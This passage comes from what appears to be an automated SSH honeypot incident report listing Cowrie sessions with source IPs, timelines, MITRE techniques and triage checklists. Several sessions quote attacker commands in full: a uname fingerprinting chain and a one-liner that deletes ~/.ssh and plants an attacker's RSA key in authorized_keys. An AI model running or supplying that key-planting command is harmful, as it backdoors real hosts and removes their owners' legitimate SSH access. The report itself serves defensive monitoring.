| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:21:40` | `cowrie.session.connect` |
| `2026-08-30 12:21:41` | `cowrie.client.version` |
| `2026-08-30 12:21:41` | `cowrie.client.kex` |
| `2026-08-30 12:21:42` | `cowrie.login.success` |
| `2026-08-30 12:21:44` | `cowrie.session.params` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.success` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.command.input` |
| `2026-08-30 12:21:44` | `cowrie.log.closed` |
| `2026-08-30 12:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b169befc7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:22 |
| **Last Seen** | 2026-08-30 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:22:02` | `cowrie.session.connect` |
| `2026-08-30 12:22:02` | `cowrie.client.version` |
| `2026-08-30 12:22:02` | `cowrie.client.kex` |
| `2026-08-30 12:22:03` | `cowrie.login.success` |
| `2026-08-30 12:22:04` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:22:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:22:04` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5929d7f668

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-30 12:22 |
| **Last Seen** | 2026-08-30 12:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:22:18` | `cowrie.session.connect` |
| `2026-08-30 12:22:19` | `cowrie.client.version` |
| `2026-08-30 12:22:19` | `cowrie.client.kex` |
| `2026-08-30 12:22:21` | `cowrie.login.success` |
| `2026-08-30 12:22:22` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33b393d3e82

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:22 |
| **Last Seen** | 2026-08-30 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:22:49` | `cowrie.session.connect` |
| `2026-08-30 12:22:49` | `cowrie.client.version` |
| `2026-08-30 12:22:49` | `cowrie.client.kex` |
| `2026-08-30 12:22:50` | `cowrie.login.success` |
| `2026-08-30 12:22:50` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:22:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:22:51` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389ddc445f08

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:22 |
| **Last Seen** | 2026-08-30 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:22:55` | `cowrie.session.connect` |
| `2026-08-30 12:22:55` | `cowrie.client.version` |
| `2026-08-30 12:22:55` | `cowrie.client.kex` |
| `2026-08-30 12:22:55` | `cowrie.login.success` |
| `2026-08-30 12:22:56` | `cowrie.session.params` |
| `2026-08-30 12:22:56` | `cowrie.command.input` |
| `2026-08-30 12:22:56` | `cowrie.log.closed` |
| `2026-08-30 12:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10095077d6c7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:23 |
| **Last Seen** | 2026-08-30 12:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:23:33` | `cowrie.session.connect` |
| `2026-08-30 12:23:34` | `cowrie.client.version` |
| `2026-08-30 12:23:34` | `cowrie.client.kex` |
| `2026-08-30 12:23:35` | `cowrie.login.success` |
| `2026-08-30 12:23:37` | `cowrie.session.params` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.success` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.command.input` |
| `2026-08-30 12:23:37` | `cowrie.log.closed` |
| `2026-08-30 12:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6b77973ed8

| Field | Detail |
|---|---|
| **Source IP** | `185.138.89[.]72` |
| **First Seen** | 2026-08-30 12:23 |
| **Last Seen** | 2026-08-30 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:23:39` | `cowrie.session.connect` |
| `2026-08-30 12:23:39` | `cowrie.client.version` |
| `2026-08-30 12:23:39` | `cowrie.client.kex` |
| `2026-08-30 12:23:40` | `cowrie.login.success` |
| `2026-08-30 12:23:40` | `cowrie.session.params` |
| `2026-08-30 12:23:40` | `cowrie.command.input` |
| `2026-08-30 12:23:40` | `cowrie.command.failed` |
| `2026-08-30 12:23:41` | `cowrie.log.closed` |
| `2026-08-30 12:23:41` | `cowrie.session.params` |
| `2026-08-30 12:23:41` | `cowrie.command.input` |
| `2026-08-30 12:23:41` | `cowrie.session.file_download` |
| `2026-08-30 12:23:41` | `cowrie.log.closed` |
| `2026-08-30 12:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.138.89[.]72` to AbuseIPDB if not already reported
- [ ] Block `185.138.89[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ecf8f25a3a4

| Field | Detail |
|---|---|
| **Source IP** | `185.138.89[.]72` |
| **First Seen** | 2026-08-30 12:23 |
| **Last Seen** | 2026-08-30 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:23:41` | `cowrie.session.connect` |
| `2026-08-30 12:23:41` | `cowrie.client.version` |
| `2026-08-30 12:23:41` | `cowrie.client.kex` |
| `2026-08-30 12:23:42` | `cowrie.login.success` |
| `2026-08-30 12:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.138.89[.]72` to AbuseIPDB if not already reported
- [ ] Block `185.138.89[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8674676249a5

| Field | Detail |
|---|---|
| **Source IP** | `185.138.89[.]72` |
| **First Seen** | 2026-08-30 12:23 |
| **Last Seen** | 2026-08-30 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:23:42` | `cowrie.session.connect` |
| `2026-08-30 12:23:42` | `cowrie.client.version` |
| `2026-08-30 12:23:42` | `cowrie.client.kex` |
| `2026-08-30 12:23:42` | `cowrie.login.success` |
| `2026-08-30 12:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.138.89[.]72` to AbuseIPDB if not already reported
- [ ] Block `185.138.89[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e3104ea667

| Field | Detail |
|---|---|
| **Source IP** | `65.181.127[.]40` |
| **First Seen** | 2026-08-30 12:23 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:23:59` | `cowrie.session.connect` |
| `2026-08-30 12:23:59` | `cowrie.client.version` |
| `2026-08-30 12:23:59` | `cowrie.client.kex` |
| `2026-08-30 12:23:59` | `cowrie.login.success` |
| `2026-08-30 12:24:00` | `cowrie.session.params` |
| `2026-08-30 12:24:00` | `cowrie.command.input` |
| `2026-08-30 12:24:00` | `cowrie.command.failed` |
| `2026-08-30 12:24:00` | `cowrie.log.closed` |
| `2026-08-30 12:24:00` | `cowrie.session.params` |
| `2026-08-30 12:24:00` | `cowrie.command.input` |
| `2026-08-30 12:24:00` | `cowrie.session.file_download` |
| `2026-08-30 12:24:00` | `cowrie.log.closed` |
| `2026-08-30 12:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.127[.]40` to AbuseIPDB if not already reported
- [ ] Block `65.181.127[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899a9a549f53

| Field | Detail |
|---|---|
| **Source IP** | `65.181.127[.]40` |
| **First Seen** | 2026-08-30 12:24 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:24:00` | `cowrie.session.connect` |
| `2026-08-30 12:24:00` | `cowrie.client.version` |
| `2026-08-30 12:24:00` | `cowrie.client.kex` |
| `2026-08-30 12:24:00` | `cowrie.login.success` |
| `2026-08-30 12:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.127[.]40` to AbuseIPDB if not already reported
- [ ] Block `65.181.127[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3497c22c46

| Field | Detail |
|---|---|
| **Source IP** | `65.181.127[.]40` |
| **First Seen** | 2026-08-30 12:24 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:24:01` | `cowrie.session.connect` |
| `2026-08-30 12:24:01` | `cowrie.client.version` |
| `2026-08-30 12:24:01` | `cowrie.client.kex` |
| `2026-08-30 12:24:01` | `cowrie.login.success` |
| `2026-08-30 12:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.127[.]40` to AbuseIPDB if not already reported
- [ ] Block `65.181.127[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f14bf56ab07

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-08-30 12:24 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:24:14` | `cowrie.session.connect` |
| `2026-08-30 12:24:14` | `cowrie.client.version` |
| `2026-08-30 12:24:14` | `cowrie.client.kex` |
| `2026-08-30 12:24:15` | `cowrie.login.success` |
| `2026-08-30 12:24:16` | `cowrie.session.params` |
| `2026-08-30 12:24:16` | `cowrie.command.input` |
| `2026-08-30 12:24:16` | `cowrie.command.failed` |
| `2026-08-30 12:24:16` | `cowrie.log.closed` |
| `2026-08-30 12:24:17` | `cowrie.session.params` |
| `2026-08-30 12:24:17` | `cowrie.command.input` |
| `2026-08-30 12:24:17` | `cowrie.session.file_download` |
| `2026-08-30 12:24:17` | `cowrie.log.closed` |
| `2026-08-30 12:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203d38f6b501

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-08-30 12:24 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:24:18` | `cowrie.session.connect` |
| `2026-08-30 12:24:18` | `cowrie.client.version` |
| `2026-08-30 12:24:18` | `cowrie.client.kex` |
| `2026-08-30 12:24:19` | `cowrie.login.success` |
| `2026-08-30 12:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4603b917015a

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-08-30 12:24 |
| **Last Seen** | 2026-08-30 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:24:19` | `cowrie.session.connect` |
| `2026-08-30 12:24:19` | `cowrie.client.version` |
| `2026-08-30 12:24:20` | `cowrie.client.kex` |
| `2026-08-30 12:24:21` | `cowrie.login.success` |
| `2026-08-30 12:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b3c0e384653

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:25 |
| **Last Seen** | 2026-08-30 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:25:02` | `cowrie.session.connect` |
| `2026-08-30 12:25:02` | `cowrie.client.version` |
| `2026-08-30 12:25:02` | `cowrie.client.kex` |
| `2026-08-30 12:25:02` | `cowrie.login.success` |
| `2026-08-30 12:25:03` | `cowrie.session.params` |
| `2026-08-30 12:25:03` | `cowrie.command.input` |
| `2026-08-30 12:25:03` | `cowrie.log.closed` |
| `2026-08-30 12:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad86aebfef5c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:25 |
| **Last Seen** | 2026-08-30 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:25:26` | `cowrie.session.connect` |
| `2026-08-30 12:25:26` | `cowrie.client.version` |
| `2026-08-30 12:25:26` | `cowrie.client.kex` |
| `2026-08-30 12:25:27` | `cowrie.login.success` |
| `2026-08-30 12:25:29` | `cowrie.session.params` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.success` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.command.input` |
| `2026-08-30 12:25:29` | `cowrie.log.closed` |
| `2026-08-30 12:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626e296065ba

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:27 |
| **Last Seen** | 2026-08-30 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:27:14` | `cowrie.session.connect` |
| `2026-08-30 12:27:14` | `cowrie.client.version` |
| `2026-08-30 12:27:14` | `cowrie.client.kex` |
| `2026-08-30 12:27:15` | `cowrie.login.success` |
| `2026-08-30 12:27:16` | `cowrie.session.params` |
| `2026-08-30 12:27:16` | `cowrie.command.input` |
| `2026-08-30 12:27:16` | `cowrie.log.closed` |
| `2026-08-30 12:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77cfe7359320

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:27 |
| **Last Seen** | 2026-08-30 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:27:20` | `cowrie.session.connect` |
| `2026-08-30 12:27:20` | `cowrie.client.version` |
| `2026-08-30 12:27:20` | `cowrie.client.kex` |
| `2026-08-30 12:27:21` | `cowrie.login.success` |
| `2026-08-30 12:27:22` | `cowrie.session.params` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.success` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:22` | `cowrie.command.input` |
| `2026-08-30 12:27:23` | `cowrie.log.closed` |
| `2026-08-30 12:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
